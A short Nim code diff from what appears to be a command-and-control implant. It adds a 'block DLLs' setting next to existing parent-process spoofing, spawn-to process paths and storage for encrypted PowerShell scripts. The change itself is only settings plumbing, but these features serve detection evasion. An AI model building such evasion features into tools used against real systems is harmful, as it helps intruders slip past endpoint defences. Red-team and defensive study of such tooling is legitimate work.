@@ -17,6 +17,7 @@ when defined(windows):
       spawntoX86*: string
       spawntoX86Args*: string
       ppid*: uint32
+      blockDlls*: bool
       importedPsScripts*: seq[ImportedScript]
       scriptEncKey*: seq[byte]  # RC4 key for script encryption
 
@@ -58,6 +59,7 @@ when defined(windows):
       globalData.spawntoX86 = ""
       globalData.spawntoX86Args = ""
       globalData.ppid = 0
+      globalData.blockDlls = false
       globalData.importedPsScripts = @[]
       # Generate random RC4 key for script encryption
       globalData.scriptEncKey = newSeq[byte](32)
@@ -94,6 +96,16 @@ when defined(windows):
     ## Set parent process ID for process spoofing
     withLock globalDataLock:
       globalData.ppid = pid
+
+  proc getBlockDlls*(): bool =
+    ## Get block DLLs setting
+    withLock globalDataLock:
+      return globalData.blockDlls
+
+  proc setBlockDlls*(block_dlls: bool) =
+    ## Set block DLLs setting
+    withLock globalDataLock:
+      globalData.blockDlls = block_dlls
 
   proc addImportedPsScript*(name: string, content: string) =
     ## Add or replace an imported PowerShell script (stored encrypted)
@@ -174,6 +186,7 @@ when defined(windows):
         "spawnto_x86": globalData.spawntoX86,
         "spawnto_x86_arguments": globalData.spawntoX86Args,
         "ppid": globalData.ppid,
+        "block_dlls": globalData.blockDlls,
         "imported_ps_scripts": scriptInfo
       }
       return $data
